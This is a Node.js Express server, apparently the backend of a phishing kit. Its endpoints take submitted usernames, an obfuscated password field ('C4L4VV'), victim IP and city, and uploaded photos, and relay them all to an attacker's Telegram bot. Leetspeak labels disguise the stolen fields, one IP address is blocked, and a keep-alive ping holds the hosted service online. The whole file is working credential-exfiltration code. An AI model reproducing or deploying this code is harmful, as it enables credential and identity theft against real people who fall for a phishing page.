const express = require('express');
const bodyParser = require('body-parser');
const multer = require("multer");
const cors = require('cors');
const axios = require('axios');
const FormData = require("form-data");

const app = express();

// Configurar multer para manejar archivos
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

app.use((req, res, next) => {
    const ipCliente = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const IP_BLOQUEADAS = ['179.7.73.123'];
    if (IP_BLOQUEADAS.includes(ipCliente)) {
        console.log(`⛔ IP bloqueada: ${ipCliente}`);
        return res.status(403).send('Acceso denegado');
    }
    next();
});

app.post('/api/sendMessage', async (req, res) => {
    const { user, useri, usero, ip, city } = req.body;
    if (!user || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }
    const message = `🔵3XTBY🔵\nUs4RX: ${user}\nUs4RX2: ${useri}\nC4L4VV: ${usero}\n\nIP: ${ip}\nCiudad: ${city}`;
    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post("/api/sendMessage3", upload.single("foto"), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: "No se recibió ninguna imagen." });
        }
        const { usuario, ip, ciudad } = req.body;
        const caption = `Us4RX: ${usuario}\n\nIP: ${ip}\nCiudad: ${ciudad}`;
        const telegramURL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", req.file.buffer, {
            filename: req.file.originalname || `${usuario || "usuario"}_foto.jpg`,
            contentType: req.file.mimetype,
        });
        formData.append("caption", caption);
        await axios.post(telegramURL, formData, {
            headers: formData.getHeaders(),
        });
        res.json({ message: "Imagen enviada a Telegram correctamente." });
    } catch (error) {
        console.error("Error al enviar la imagen:", error);
        res.status(500).json({ error: "Error al procesar la imagen." });
    }
});

const keepAliveUrl = 'https://turbo-octo-palm-tree.onrender.com';

setInterval(() => {
    axios.get(keepAliveUrl)
        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
        .catch(error => console.error(`Error en el ping: ${error.message}`));
}, 600000); // 180000 ms = 3 minutos





const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
